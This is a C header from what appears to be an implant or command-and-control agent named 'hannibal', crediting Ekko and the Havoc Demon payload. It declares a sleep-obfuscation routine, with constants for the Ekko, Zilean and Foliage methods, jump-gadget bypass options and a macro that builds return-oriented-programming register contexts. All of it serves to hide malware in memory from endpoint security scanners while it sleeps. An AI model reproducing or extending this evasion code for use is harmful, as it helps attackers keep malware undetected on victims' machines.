// Pieces were taken from both:
// Credit: https://github.com/Cracked5pider/Ekko
// Credit: https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Obf.c


#ifndef UTILITY_SLEEP_EKKO_H
#define UTILITY_SLEEP_EKKO_H

#include "hannibal.h"
#include "hannibal_tasking.h"
#include "utility_rand.h"
#include "utility_winapi_function_resolution.h"



#define SLEEPOBF_NO_OBF  0x0
#define SLEEPOBF_EKKO    0x1
#define SLEEPOBF_ZILEAN  0x2
#define SLEEPOBF_FOLIAGE 0x3

#define SLEEPOBF_BYPASS_NONE 0
#define SLEEPOBF_BYPASS_JMPRAX 0x1
#define SLEEPOBF_BYPASS_JMPRBX 0x2

#define LDR_GADGET_MODULE_SIZE ( 0x1000 * 0x1000 )
#define LDR_GADGET_HEADER_SIZE ( 0x1000 )


// TODO: Cleanup

// typedef struct
// {
//     DWORD	Length;
//     DWORD	MaximumLength;
//     PVOID	Buffer;
// } USTRING;

// NTSTATUS (WINAPI* SystemFunction032) (USTRING* data, USTRING* key);


#define NT_SUCCESS(Status)              ( ( ( NTSTATUS ) ( Status ) ) >= 0 )


#define OBF_JMP( i, p ) \
    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {    \
        Rop[i].Rax = (UINT_PTR)p;                  \
    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {  \
        Rop[i].Rbx = (UINT_PTR)&p;                \
    } else {                                        \
        Rop[i].Rip = (UINT_PTR)p;                  \
    }

void utility_sleep_ekko(ULONG TimeOut, ULONG Method);

// BOOL EventSet(
//     IN HANDLE Event
// );

#endif // UTILITY_SLEEP_EKKO_H